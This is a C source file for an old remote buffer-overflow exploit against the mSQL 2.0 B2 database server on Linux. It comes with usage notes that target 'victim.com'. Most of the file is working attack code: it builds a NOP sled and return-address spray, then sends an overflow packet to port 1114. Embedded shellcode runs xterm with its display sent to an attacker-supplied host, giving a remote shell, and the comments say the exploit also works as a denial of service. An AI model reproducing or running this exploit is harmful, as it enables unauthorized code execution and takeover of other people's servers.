/*
 * Sekure SDI - Brazilian Information Security Team 
 *
 * SDI-msqlie (Nov 26, 1998)
 *
 * mSQL 2.0 B2 exploit for linux. also works as DoS attack
 * for higher versions. This bug was discovered by  c0nd0r
 * and resides in the mSQL log of connections.
 *
 * This program opens a xterm for the specified host.
 *
 *
 * usage:
 *     msqlie victim.com lame.org:0 [offset]
 *
 *
 * remember, the msql MUST to be running in DEBUG mode!
 *
 *
 * by jamez and c0nd0r from uground/sekure.  
 * 
 * thanks to bishop.
 *
 *
 */


#include <signal.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netdb.h> 

#define BUFFSIZE 15000
#define PKT_LEN 11000
#define NOP 0x90



/*
int main() {
        __asm__("
        jmp   0x31
        popl  %esi
        movl  %esi,0x30(%esi)
        leal  0x15(%esi),%ebx
        movl  %ebx,0x34(%esi)
        leal  0x1e(%esi),%ebx
        movl  %ebx,0x38(%esi)
        xorl  %eax,%eax
        movb  %eax,0x14(%esi)
        movb  %eax,0x1d(%esi)
        movb  %eax,0x2f(%esi)
        movl  %eax,0x3c(%esi)
        movb  $0xb,%al
        movl  %esi,%ebx
        leal  0x30(%esi),%ecx
        leal  0x3c(%esi),%edx
        int   $0x80
        xorl  %ebx,%ebx
        movl  %ebx,%eax
        inc   %eax
        int   $0x80
        call  -0x36
        .string \"/usr/X11R6/bin/xterm -display xxx.xxx.xxx.xxx:0\"");
}
*/


/* base */
char shellcode[] = 
        "\xeb\x31\x5e\x89\x76\x30\x8d\x5e\x15\x89\x5e\x34"
        "\x8d\x5e\x1e\x89\x5e\x38\x31\xc0\x88\x46\x14\x88"
        "\x46\x1d\x88\x46\x2f\x89\x46\x3c\xb0\x0b\x89\xf3"
        "\x8d\x4e\x30\x8d\x56\x3c\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff"
        "/usr/X11R6/bin/xterm -display ";
	


int s;
struct sockaddr_in addr;
char buff[BUFFSIZE];


unsigned long resolve(char * host) 
{
  long ret;
  struct hostent *  he;

  ret = inet_addr(host);

  if(ret == -1) {
    if((he = gethostbyname(host)) == NULL) {
      printf("unknown host %s\n", host);
      exit(1);
    }
    else
      return (*(unsigned long *)he->h_addr);
  }
  else
    return(ret);
}


      
void time_out(int i)
{
  alarm (0);
  signal (SIGALRM, SIG_DFL);
  printf ("unable to connect: connection timed out.\n");
  exit (1);
}
     





int main(int argc, char * argv[]) 
{
  
  char * host, * xterm_host;
  int port = 1114, i, x, len, offset = 0;

  unsigned long evil_addr;

  
  if(argc < 3) {
    printf("msqlie\n");
    printf(" - usage: %s host xterm_host:0 [offset]\n", argv[0]);
    exit(0);
  }
  else {
    host = argv[1];
    xterm_host = argv[2];
  }
  if(argc > 3) offset = atoi(argv[3]);
  

  evil_addr = 0xbfffceaa + offset;
  

  printf("using addres: 0x%x\n", evil_addr);
  printf("let's try to get in...\n");

  

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = resolve(host);
  
  
  if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    printf("can't creat socket.\n");
    exit(1);
  }
  


  signal (SIGALRM, time_out);
  alarm(15);
  

  if(connect(s, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
    printf("connection failed!\n");
    exit(1);
  }

  alarm(0);
  

  i = 0;

  buff[i++] = (unsigned int)(PKT_LEN & 0x000000ff);
  buff[i++] = (unsigned int)(PKT_LEN & 0x0000ff00) >> 8;
  buff[i++] = (unsigned int)(PKT_LEN & 0x00ff0000) >> 16;
  buff[i++] = (unsigned int)(PKT_LEN & 0xff000000) >> 24;




  for(; i < 8001 ; i++)
    buff[i] = NOP ;


 for(; i < BUFFSIZE; i += 4) {
    buff[i  ] = evil_addr & 0x000000ff;
    buff[i+1] = (evil_addr & 0x0000ff00) >> 8;
    buff[i+2] = (evil_addr & 0x00ff0000) >> 16;
    buff[i+3] = (evil_addr & 0xff000000) >> 24;
  }


  /* fix up the execve code */  
  len = strlen(xterm_host);

  shellcode[5 ] = 0x1f + len;
  shellcode[11] = 0x23 + len;
  shellcode[17] = 0x27 + len;
  shellcode[28] = 0x1e + len;
  shellcode[31] = 0x2b + len;
  shellcode[38] = 0x1f + len;
  shellcode[41] = 0x2b + len;


  /* base */
  for(i = 8001, x = 0; x < strlen(shellcode); x++, i++)
    buff[i] = shellcode[x];
   

  /* victim host */
  for(x = 0; x < strlen(xterm_host); x++, i++)
    buff[i] = xterm_host[x];
    

  
  buff[PKT_LEN] = '\n';
  buff[BUFFSIZE - 1] = 0;


  printf("sending...\n");


  write(s, buff, sizeof(buff)); 


  sleep(10);

  printf("have phun! =)\n");
  
}








